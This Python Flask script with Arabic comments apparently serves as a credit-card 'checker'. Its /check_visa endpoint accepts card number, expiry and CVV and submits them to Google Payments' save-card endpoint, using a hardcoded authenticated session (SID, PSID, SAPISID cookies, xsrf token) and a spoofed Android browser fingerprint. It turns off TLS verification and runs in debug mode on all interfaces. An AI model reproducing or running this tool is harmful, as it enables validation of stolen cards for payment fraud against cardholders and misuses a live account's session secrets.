from flask import Flask, request, jsonify
import requests
import urllib3

# تعطيل تحذارات SSL غير الضرورية
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

@app.route('/check_visa', methods=['GET'])
def check_visa():
    # استقبال بيانات الفيزا من query parameters
    visa_data = request.args.get('visa')
    
    if not visa_data:
        return jsonify({'error': 'يجب تقديم بيانات الفيزا في الصيغة: رقم_الفيزا|الشهر|السنة|cvv'}), 400
    
    try:
        # تقسيم بيانات الفيزا إلى مكوناتها
        card_number, month, year, cvv = visa_data.split('|')
    except ValueError:
        return jsonify({'error': 'صيغة البيانات غير صحيحة. يجب أن تكون: رقم_الفيزا|الشهر|السنة|cvv'}), 400
    
    # تعريف الكوكيز المحدثة
    cookies = {
        'OTZ': '8178671_44_48_171240_44_319500',
        'AEC': 'AVh_V2iLNQRzcEXTF3vPa7OKyNp7A_CPeLY78RHTg_Y55fBBgXwzH3XI4gk',
        'SID': 'g.a000zgiGj7JLPqknlTzcd8r7SVTSOyRYIM89xxNjijaQtmLVl0eVuO7pTCPva7sn0FQ8CflwiQACgYKARISARYSFQHGX2MiSCi4FlIgiH7ImzQ11-KzrhoVAUF8yKqY_Aj-Fv9Llkm2VGLmUM2v0076',
        '__Secure-1PSID': 'g.a000zgiGj7JLPqknlTzcd8r7SVTSOyRYIM89xxNjijaQtmLVl0eVvGuRCcRLadRtFhS36jxKYwACgYKAQgSARYSFQHGX2MirchICEzeFedNhZ0vtxd5xRoVAUF8yKqx-1WHeKOLrqTYTPuLHHRh0076',
        '__Secure-3PSID': 'g.a000zgiGj7JLPqknlTzcd8r7SVTSOyRYIM89xxNjijaQtmLVl0eVnF8eHO4ja2MLFGecbN_J8QACgYKAYQSARYSFQHGX2MiSVrooXsvS24OZL3irGFBqxoVAUF8yKr4iKExCv1E4FvFM44O-ZXX0076',
        'HSID': 'APJS_TaVdn24EEIBQ',
        'SSID': 'AF8ZM84MsejkY-Pym',
        'APISID': 'MPO5KiSxe2oBoywN/AzBxLLRAFxIkftopS',
        'SAPISID': 'MZoK_k5Jfz26i8UL/AlULB6vwXTgX2hMhX',
        '__Secure-1PAPISID': 'MZoK_k5Jfz26i8UL/AlULB6vwXTgX2hMhX',
        '__Secure-3PAPISID': 'MZoK_k5Jfz26i8UL/AlULB6vwXTgX2hMhX',
        'NID': '525=a4nTNWhimhmxljmf2Reyt2_HPAsMeE3Qe3EGDdtlzDe60vJTTQe6P-247aEsdRs1sp8PdbGDUbDRdg3XMMUrkMzyGoDCFbaMmPr3h3QXaw2v8OdEC6jrv9INT6Cz50QVxo7Sxd70bxCeOMGL1k9nlYhwY7BwsUb-w0iNoVJ-0dNDhMFeWL965ItZAzaQR8K7VNmeETy-Ewl2p_1K3FNo0HmTXfvCVq3Dmv2-itNyrEv4sZx8Z3VZ81OB4KTis-9ty40wmi9ooysURWZnYKucoig7mxi_bA_r-MdvELxR2vTGjSlyEOernb1UjPd8_ybDNWWP8nyKzEeAZzqWE1YCO4gEEdevQ3FGOm0uFjjBxIdPcEPnGqdzcJvH8TWs4oggqK0lU-x2jjN-gTsOQo38hDy0dAuHLor6K8Y1NR3qfvW95PHq2KWXO0yPLHAPxCNGJpPEj7hWklTNevKbKLZHFhU2alkt-GM7V87RaV5hVeLWgmX37iC5unFZDYP7rBxBU98SY2xTraK7_FQiFtUV8_MdjqoeiWcQpPUST56eRwQFalYeIXOpyIj3sItkY4448tZYwtfW2E318QDBjsMw7-aurt-cxWAVj5fchTGoxkWvI18LIAXyc6g1XTNQRxdbc-Fd5ORQnNNBGjavKGT6yPC70blm8ZtTgtM9eGxTIuEhaLpO05B5tWOrA9X9fYHJT8XwKMQIamU87vuZuBHwB376A9hWHTHyw9dDchpZclAkK-J5kn_WpeTL1TAmFjWCm5_hCeuwyOHTct0v3c7Y0AH5Qq2CI41iyX5Pq8Uw_827by4oYGNv0INulE30098czP4ZqB_wS23UDTyoQ7qTzEku6eRleYlMMEHhtpjynALW04fwDMsAdiXQ5HT5INNEjMch0sj7gruCjam70YPRqDWe5YyENSDGdpRAA8IF7mx1UGJUyh1REKbUXVPMP8cSZSKRGJ_gJLpFn2OAsspJCLhs88i0EUUuZ0OYleUvPeneWyC4FhPDfvkdD8nubBW321D7Q0Ga9lymhm22NQPf9Feu6O3QIjV6NY1DHC05j8yEojEDDDdOM7Dr72ciUeakTLmrD3BP5ws3URUzk5r7UIdr9OEwbixLD6eg7mkKLOu4ek_Uhki5xCruxmQd187l',
        '__utma': '207539602.2100594883.1742201890.1753693869.1753702107.7',
        '__utmc': '207539602',
        '__utmz': '207539602.1753702107.7.7.utmcsr=wallet.google.com|utmccn=(referral)|utmcmd=referral|utmcct=/',
        '__utmt': '1',
        'SIDCC': 'AKEyXzVGcUvZvjYGkW6ro8BTCFyUL16tghng3yNgbRCIoCRyo60H7R-6fsyAUT9hSd4hxtMHAA',
        '__Secure-1PSIDCC': 'AKEyXzUzXA4yVLC5k-xClRd9sFLI1nCIVOx7Z5opD2H0lIRV2_05t0Gilurt5j07VrhWbyWmZ1c',
        '__Secure-3PSIDCC': 'AKEyXzVw672Zc7uivdwnemcF3Vv9pz-zCZ1sa2skRfL9o4jzTL9UwHUvrhpWsWpGocTVrbuhGIU',
        'S': 'billing-ui-v3=lLAq9998PTAbz4I3kF1CvtW6ZHE6Idxs:billing-ui-v3-efe=lLAq9998PTAbz4I3kF1CvtW6ZHE6Idxs',
        '__utmb': '207539602.5.9.1753702165664',
    }

    # تعريف الهيدرات المحدثة
    headers = {
        'authority': 'payments.google.com',
        'accept': '*/*',
        'accept-language': 'ar-AE,ar;q=0.9,en-IN;q=0.8,en;q=0.7,en-US;q=0.6,he;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://payments.google.com',
        'referer': 'https://payments.google.com/payments/u/0/embedded/instrument_manager?tc=96%2C87&wst=1753702097990&cst=1753702103550&si=1680181945907099&pet&sri=2&hmi=false&ipi=ibhfcte65pv&hostOrigin=aHR0cHM6Ly93YWxsZXQuZ29vZ2xlLmNvbQ..&eo=https%3A%2F%2Fwallet.google.com&origin=https%3A%2F%2Fwallet.google.com&ancori=https%3A%2F%2Fwallet.google.com&mm=e&hl=ar&style=%3Am2&ait=GAIA&cn=%24p_nxfdjdta3jc80&fms=true&actionToken=CiQIASICVVNoAXAAeAGaAQ8KByDD7%2FOOvw8g9acEYgDAAgD4AwE%3D&spul=501&cori=https%3A%2F%2Fwallet.google.com',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-arch': '""',
        'sec-ch-ua-bitness': '""',
        'sec-ch-ua-full-version': '"137.0.7337.0"',
        'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-model': '"SM-A307FN"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-platform-version': '"11.0.0"',
        'sec-ch-ua-wow64': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-client-data': 'CIOJywE=',
        'x-requested-with': 'XmlHttpRequest',
    }

    # تعريف البارامترات المحدثة
    params = {
        'ait': 'GAIA',
        'cn': '$p_nxfdjdta3jc80',
        'eo': 'https://wallet.google.com',
        'hostOrigin': 'aHR0cHM6Ly93YWxsZXQuZ29vZ2xlLmNvbQ..',
        'ipi': 'ibhfcte65pv',
        'hl': 'ar',
        'mm': 'e',
        'origin': 'https://wallet.google.com',
        'si': '1680181945907099',
        'style': ':m2',
        'cst': '1753702103550',
        'wst': '1753702097990',
        's7e': '3.1.0.0;3.1.0.1',
        'rt': 'j',
        's': '4',
    }

    # تعريف بيانات الطلب المحدثة
    data = {
        'xsrf': 'AJWlU2OGmardo7roMIQNW0naGl1tDUd14g:1753702106395',
        '3.1.0.0': card_number,
        '3.1.0.1': cvv,
        'msg': '[[null,"ACo329yI0QtOVBGKq9Xji9P+aJ/am9Rxz5lZ99n5ZuhdsshajzR9cQSFA/NkaFqcKPfcMzy3FaSTv3J079d6xXqm++jCLA1Ow9bbrsx/n3WrtwEmF1XSf/43oUdDjPtbqdwVAZeHvO286sAHXRmTyD9Zslq88XLm0MEDJBrQBSZLFggHImr96Y644oZD4EG9EBTMQlhNP4kuq2UZHM9eemW9SqOuDRFeYJx5y/SGEqzhMfWvdvLvV3RxtNy9GPqoqJl5GkOKBF6y",null,[null,[null,null,null,["!3t2l3YXNAAa73VJ7m91CuaxwT7mDFn87ADQBEArZ1PX791Ug53UzGJ1xiil5Bg07UcvjivABrWKMGB7NQhiqxQ_1-KNgLOON4yXeBDrMAgAACJtSAAAAK2gBB34ATBBgOdYtEKfVVHtU_y_uIRy-n0TNaiG7BImb7fvf49fmXDKressSIi9rurbuMsz6OyFf2l3DSEVmkvyXhN-baf4oiAPaAUyjG7yy_nOZCuqZE5eahj8CEiW-IabhYGL27hTPp4OH4splWph4ZskCJdZW2l0qWAJSKXTbTtdlsaAnNK70Qvl-Aa-H4FAgVsTEPCKjtOA677fJjxbHrZhiBp3ILX9gz5rYGB-Xp1sEyIsR2VAiDE4no_wBCq9FHWQ71HM3opKuIEonbvFn2Ga2EkHVCGwZC4txmKfRawarTHWlYttqvn1-pDr4crtlZhJaIZ8__YJpNb2_MY-XcK-0kN8Zf0VAZGRE0jpS2tZNTTxXORM2820_HddGLw9Qa-RPrs-l2M3fsJiKPMD9_Jmj4gjJAJ9a5X6jfxp2YmIZEkE-5Eg_iahwi-gv9Tlb-cFZG9brP5lTchBjjP6ETNa7Ryv4LYLGRMZwQWRBPcqwkr1HQdtTYrhko826wdLJIc5PINFNrw1sxL2spo9fCJwuTE_bWDE1q_4xp5n2IrTAk-nBEtvPPChivUAXnwHawOKU6rT9y8Redo6s9qXe3lLUaZXFZyHOK4buLweWQ-L0VuK3G7hzJ8IK7dYn_5Y42BcSYHlcIVncDwaK7h4yt8ZJstx0NaH5V-lAc3owai2j4TMhFsYKpVdkw6xsSnYAj5azP01sT1ejMyHNHnv0ybc4V1Yl-Cl8y_yI1DvppfoYc2ojMs280BZu_yrVBlrLkcLd6ZHCIROaptmVjzhyd3fkOpoxmWEQWL1GH1PNg2HCVn7ZqP7JwhS6vgG3ubia_V-yRlhDVmfHUj6OZazyoePpn-FUuBgm9tfTUV_SnzZdjM0e2jULrk4-OOXKqjuMnsJssfoqUZRFfPq15TdUBivgSTOf-3vI62k4sbztjo8cCQHgWCk65aqYnO9REnXrFitnE_WTSTFalna11SjSAlv8kF4ne_KcG6BCTEF0LpDYrnUX9moAIIcrndXqTYln8NZ0Rf9uFO63xwm2IrdXWuxgSxI6ppdsCzcQcTbA-MdKqMs4NBsKCayhUh3myKNmA2QqetqJpAx_fclfJ0rs9QkeddyQw3NAxeHjSDp_6wmhVKW3YoICXXwZommp3dLWJe4M5cEeOFes0lILx4lbUABIr5f7ZPb_2rcAfQ1ocF0N_1cccV3AoH7t4AsS7QNQQHJXDtOlilp3-Vg7YClrVW7h8bRn4XEP6wDFShFi5Iiw5FWndmhWmcNLtDWAthbVvdH_8IInZtdR7ynczv89d9IKKGK4JjptM6rRrJeTw0noHHZLbYokmsk26kAvjL7u_-aJuyEMWcwXc2Ngks6Zf_uefwksOVh7jzUJiu2PnXvsITOT5F1qVPIIWJwxGnNJo3RKmHKg_f1568bP4zhi5_C5tX8kSOQvty8lyIY2VMJowssLKrijWlpgAOli5pHkoDYypKwGP9cVtLLB192FXaxSRT8DgueCX_E3KeVE83PnuS4a9BAPYJ8HRp1_9LZ09GRu4TJ40ehYCVXx4F9hFcHrJDPGBLKpqiPWZhSB1zvek3RTx6YfO1HC88tcxr2tS-VXVr19N1MfaxRZE0DbwRGo2iYNL_Yq_rFuojw-_cty08g1DX4tqkhZBBDXSBYDgjmUbdz7v7a7uUb7GNAKpa5htYfv0IdEvj-flpszgJhn3Qr17SsUPyS5kZh1v--XChaK4nTIDE8SQVwofqeqOg_XtpO0X0YXd8VjIpTEQbhX-0Fy9S6VvLmmGyIheJ27-cI23jagQ-s6wgIiL2V9ZRf_L-3EHlr7eI1NXgAoJvXjB2ztmQwZUQiFcXolhgDWrcvaLtGDMU1fY61PD2mhcIFRLVkFmdkzkLsrcksQauz67eoaGaJ8H35SDgzlOT262brv4CRURu2GNzCVMjBeTJRy_Hah2ctuQp2gd_LV3EdePKw_28vcQ5i-EQBIuyppvhUNhE5MkSyHzWyaRbe1spyXJD0eTp2youEYi3DkLxddwp9aT-ddBVtKtlt3iLYx5NRTayM3Bbz7xxEDW2M5QVWLMmIPozcJja4OSNFv65LCL2kXZiGbHue0yV5jw5XZumU5W6w9Gbna7ducgE4SRTH7CqTSerUeCo-k7ziVd0NPzebgkmbDua8tEkyjCSGcNow67bunElQ7sDmqUhQ8qxIMaGT8Tm9qrt5Ausn3EDDFlDtAgDKA2skcwSAD9rTuPC8Q8EIC0KUHFb7ZurKbiTmNvkfIOec6g3198vksWY0lqd3CGqBy4uZFIMD5E3Sr5ApYeZC6hLOSIvVxe7T2emXaDhW7BmvgbSfQHtPZ21F1qur24yBcr-TyIB9Fv03gsQoHM3i0fv7MqKj5w0XJmCkQWXO-wMRvg0BLwF5eCT7deDILw7XnSMFjr7JZeumAr0fx94SW5Izo_p6cBHtFttSj4DOVI-pvuH2eHwairxFZkRqH_eOScCZF6aTB5n0ccUsIlilYJg-aq8uzwmduREMzWlpPJbTRK-SpFd2HizBNo8N99jRaWu2r2fKu11TWdGeaNpAnlaB-7PWQZQ3CD3K-qthfNadZI5dE2l3BVLJuNDaC9AL1R9bouKlMEf9Gy8SnEbQLK0HmR_97G7pGFZoWrP5qzSSUCYLVTZcxR6Zo8LCaF6aUWRB0w6xfY1TjblXCpbr9s19628SBrr_-l5CXtNUJM7jRk4W3X23JL8Kj0rQg_3vbqMhdOM1AEtrwzUP_oiM7apyZ9exUOfOTY9SuDMaNIQp-tZxgfHg05hdMHydwHIay2cCyRYBPzcynX3addYdAz6I2fqOPej5Nz3Yk4xWa6xouQIoSDOzrDXjLxvG32jbnpAZWdjAVpk0kIHlycjmUkmdQgClFKEU1k16QDgZqyKg5VvgIO4Jsv3DkcGmdvtC8SM-SwmNUMMOlVjAT1wx3iUu32YBxBOTemGuxZ-Y3PpmNWBEpgh0Lw05mPOI6Q_Ho_B62l9xsRrzLtIgvQ6CBUgok0RoNjBVqbCBW7DJ0hrAKLzwxjuF8qjS1enh8hWThuUb2rEFLQz583w4pbYlNi9zxPaYpUke32pN8pZthKwC11CMfnn_wd6GMN0FoYXu19hu8L3uAEeNkRKePSksqjC3Jc_9uxwKQwZU0B_DeOevPTndfeWMykPOmgmjRuFrsKgNchGZKddRBvLpRlEXCna40ep8h2aOY9AjyMScDwP0KEBF89ZTBiyhGhnWgSvw8tXE5XqUg-vDELfCuf-dfHmwKKz7y0tksAKG4H1y-0KX4KHI6S0wX5AzuEUY1-ly7URwOQZdQMRALU0ceuxHhags8O7yCNg8BTYhgKD9-P2lMjH_lLe2-lQ4IjRqmWaOXMdjgVjy4LM8xNpZ72WalU7DPmShRLpXtZNYYODIS3rPAtUFRUfwTCiIdfs2DYSzQ7PpWgsCcfH_aXz8n9B4qD6dHvzYoy2QfaxdGa8cbb7OtpVsMs1dKlRSmVuLYHy_dOtXhv-OLD1-Q69NrmvjIfM4cObOQRneNjYFj9i9HEVatgjttE4OXRTUm-xrQDkP_BRNKu7lgGFrpJlc60MRxlhh-EnSWFNzVyts6qnuhp6QsjY81irne_ENfHx3DN2xFqAy2r_LnXj6YEkdyKxAuG4r0Iw2fpoRy8PhID8kKv3Su66Canqh0KLfuwo_YfbgmyzdtECOl2Rb9wh0XVrQz8lTDp7lQOBj7YhlYcmbySX4xLzrH3a5XZ20Oc2SP2-9GrlV8QgfrXt3V_eOcqN51AJnNjkeO3Ys1p3BSjFZE66nasVSVc3w8N-doXjryxC4iB35ux2y"]]],null,null,"ar",1,1],null,null,[null,[["__secure_field__4fa1d0a7","__secure_field__4fa1d0a7",11,2029,null,"5456",null,"__s7e_data__61bb463a","هونجا البونجا",[["US",null,"NY",null,"New York",null,null,null,null,null,null,"10001",null,["Pejrlrj","836393"]],null,null,null,"billingAddress",null,null,2001],"CAIQAhogEgJVUxoDVVNEMAZAAFABYPWnBGoCCgCgARSoARSwARQ=","0.buyertos/US/6/20/en,0.privacynotice/ZZ/5/9/ar","creditCardForm-1"]]]]',
        'kt': 'Rs2.0.8:billing_ui_v3::s11,2,26b5e19,1,140,a063ebe9,1,2b6,edd98bac,0,18,4863fd35,0,140,cb2d5c6f,0,2b6,6ad47c6c,2,e8,7bdb49f6,0,95,b6540200,0,140,eea820b6,0,236,1aa4331,0,"Linux armv81,f54683f2,1,"Google Inc.,af794515,0,"5.0 28Linux3b Android 103b K29 AppleWebKit2f537.36 28KHTML2c like Gecko29 Chrome2f137.0.0.0 Mobile Safari2f537.36,d81723d1,0,"ar2dAE,5cc3ab5f,0,"Mozilla2f5.0 28Linux3b Android 103b K29 AppleWebKit2f537.36 28KHTML2c like Gecko29 Chrome2f137.0.0.0 Mobile Safari2f537.36,24a66df6,1,-b4,"Thu Jan 01 1970 023a003a00 GMT2b0200 282a48424a2a 343142 234831482827 27443133454a29,770c67fc,0,6:a21,3,19850ca8130,10,"cardnumber,"ccmonth,"ccyear,"cvc,"ccname,"COUNTRY,"ORGANIZATION,"RECIPIENT,"ADDRESS_LINE_1,"ADDRESS_LINE_2,"LOCALITY,"POSTAL_CODE,"PHONE_NUMBER,"embedderHostOrigin,"xsrf,"sri,84,2dd:a40,"f,19850ca840d,"n,0,0,"t,19850ca7a6b,0,0,0,0,19850ca7a7e,19850ca7a7e,19850ca7a7e,19850ca7a7e,19850ca7a7e,0,19850ca7a8d,19850ca7ead,19850ca7ee0,19850ca7ed0,19850ca814a,19850ca814a,19850ca8456,19850ca86ff,19850ca8700,19850ca872d:a10:a31,3,"h,1,"p,57,15,"m,21bd,152d,cde,cd6,cc7,10bc,3aa,248,175,96c,35a,133a,997,a05,29bf,1c70'
    }

    try:
        # إضافة جلسة مع إعدادات أفضل للاتصال
        session = requests.Session()
        session.verify = False  # تعطيل التحقق من SSL (لأغراض الاختبار فقط)
        session.headers.update(headers)
        
        # إرسال الطلب مع إعدادات متقدمة
        response = session.post(
            'https://payments.google.com/efe/payments/u/0/instrument_manager_save_page',
            params=params,
            cookies=cookies,
            data=data,
            timeout=15,
            allow_redirects=True
        )
        
        # إرجاع الاستجابة كـ JSON
        return jsonify({
            'status_code': response.status_code,
            'headers': dict(response.headers),
            'content': response.text
        })
        
    except requests.exceptions.RequestException as e:
        return jsonify({
            'error': str(e),
            'message': 'فشل في الاتصال بخادم جوجل. يرجى التحقق من اتصال الإنترنت أو تحديث الكوكيز والهيدرات.'
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
